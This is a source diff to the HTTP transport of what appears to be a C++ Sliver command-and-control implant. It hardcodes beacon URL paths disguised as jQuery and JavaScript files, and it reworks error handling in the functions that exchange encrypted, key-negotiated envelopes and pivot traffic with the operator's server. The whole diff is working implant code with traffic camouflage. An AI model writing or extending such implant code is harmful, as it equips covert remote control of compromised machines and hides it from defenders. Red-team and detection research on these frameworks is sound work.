@@ -60,15 +60,29 @@ namespace transports {
 			// 
 		};
 #else
+		//std::vector<string>segments = {
+		//	// {{range .HTTPC2ImplantConfig.SessionPaths}}
+		//	"{{.}}",
+		//	// {{end}}
+		//};
+		//std::vector<string>filenames = {
+		//	// {{range .HTTPC2ImplantConfig.SessionFiles}}
+		//	"{{.}}",
+		//	// {{end}}
+		//};
 		std::vector<string>segments = {
-			// {{range .HTTPC2ImplantConfig.SessionPaths}}
-			"{{.}}",
-			// {{end}}
+			// 
+			"upload",
+			// 
+			"actions",
+			// 
 		};
 		std::vector<string>filenames = {
-			// {{range .HTTPC2ImplantConfig.SessionFiles}}
-			"{{.}}",
-			// {{end}}
+			// 
+			"api",
+			// 
+			"samples",
+			// 
 		};
 #endif
 		auto elems = RandomPath(segments, filenames, "php");
@@ -109,15 +123,37 @@ namespace transports {
 		};
 
 #else
+		//std::vector<string>segments = {
+		//	// {{range .HTTPC2ImplantConfig.PollPaths}}
+		//	"{{.}}",
+		//	// {{end}}
+		//};
+		//std::vector<string>filenames = {
+		//	// {{range .HTTPC2ImplantConfig.PollFiles}}
+		//	"{{.}}",
+		//	// {{end}}
+		//};
 		std::vector<string>segments = {
-			// {{range .HTTPC2ImplantConfig.PollPaths}}
-			"{{.}}",
-			// {{end}}
+			// 
+			"script",
+			// 
+			"javascripts",
+			// 
+			"javascript",
+			// 
+			"jscript",
+			// 
+			"js",
+			// 
+			"umd",
+			// 
 		};
 		std::vector<string>filenames = {
-			// {{range .HTTPC2ImplantConfig.PollFiles}}
-			"{{.}}",
-			// {{end}}
+			// 
+			"jquery.min",
+			// 
+			"jquery",
+			// 
 		};
 #endif
 		auto elems = RandomPath(segments, filenames, "php");
@@ -146,7 +182,7 @@ namespace transports {
 		genSegments.push_back(filename);
 		return genSegments;
 	}
-bool HttpClient::SessionInit() {
+bool HttpClient::SessionInit(string& error) {
 		auto key = crypto::RandomKey();
 		auto server_pbk = crypto::GetServerECCPublicKey();
 		auto keyPair = crypto::getKeyPair();
@@ -172,8 +208,8 @@ bool HttpClient::SessionInit() {
 		session->SetBody(cpr::Body{ encoded });
 		cpr::Response resp = session->Post();
 		if (resp.status_code == 0) {
-			cout << "[-] Unable to connect" << endl;
-			throw exception();
+			error = "[-] Unable to connect";
+			return false;
 		}
 		if (resp.status_code != 200) {
 			auto serverDateHeader = resp.header.find("Date")->second;
@@ -191,7 +227,7 @@ bool HttpClient::SessionInit() {
 		return true;
 	}
 
-bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::Envelope& recv) {
+bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::Envelope& recv,string& error) {
 	string data;
 	to_send.SerializeToString(&data);
 	auto reqData = this->context.Encrypt(data);
@@ -209,12 +245,12 @@ bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::En
 	auto resp = this->session->Post();
 	this->pollMutex.unlock();
 	if (resp.status_code == 0) {
-		cout << "[-] Unable to connect" << endl;
-		throw exception();
+		error = "[-] Unable to connect";
+		return false;
 	}
 	if (resp.status_code == 404) {
-		cout << "[-] http 404 response " << std::endl;
-		throw exception();
+		error = "[-] http 404 response";
+		return false;
 	}
 	if (resp.text.empty()) {
 		return false;
@@ -223,7 +259,7 @@ bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::En
 	auto plain = this->context.Decrypt(decoded);
 	return recv.ParseFromString(plain);
 }
-bool HttpClient::WriteEnvelope(sliverpb::Envelope& envelope) {
+bool HttpClient::WriteEnvelope(sliverpb::Envelope& envelope,string& error) {
 	string data;
 	envelope.SerializeToString(&data);
 	auto reqData = this->context.Encrypt(data);
@@ -243,25 +279,26 @@ bool HttpClient::WriteEnvelope(sliverpb::Envelope& envelope) {
 	auto resp = this->session->Post();
 	this->pollMutex.unlock();
 	if (resp.status_code == 0) {
-		cout << "[-] Unable to connect" << endl;
-		throw exception();
+		error = "[-] Unable to connect";
+		return false;
 	}
 	if (resp.status_code == 404) {
-		cout << "[-] http 404 response " << std::endl;
-		throw exception();
+		error = "[-] http 404 response ";
+		return false;
 	}
 	else {
 		return true;
 	}
 }
 
-bool HttpClient::WriteEnvelopeNoResp(sliverpb::Envelope& envelope) {
+bool HttpClient::WriteEnvelopeNoResp(sliverpb::Envelope& envelope, string& error) {
 	if (envelope.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
 		envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
 	}
-	return this->WriteEnvelope(envelope);
+
+	return this->WriteEnvelope(envelope, error);
 }
-unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope() {
+unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope(string& error) {
 	if (this->closed) {
 		return nullptr;
 	}
@@ -280,8 +317,8 @@ unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope() {
 	auto resp = this->session->Get();
 	this->pollMutex.unlock();
 	if (resp.status_code == 0) {
-		cout << "[-] Unable to connect" << endl;
-		throw exception();
+		error = "[-] Unable to connect";
+		return nullptr;
 	}
 	if (resp.status_code == 403 || resp.status_code == 204) {
 		cout << "got "<< resp.status_code << " from for " << this->sessionID << endl;
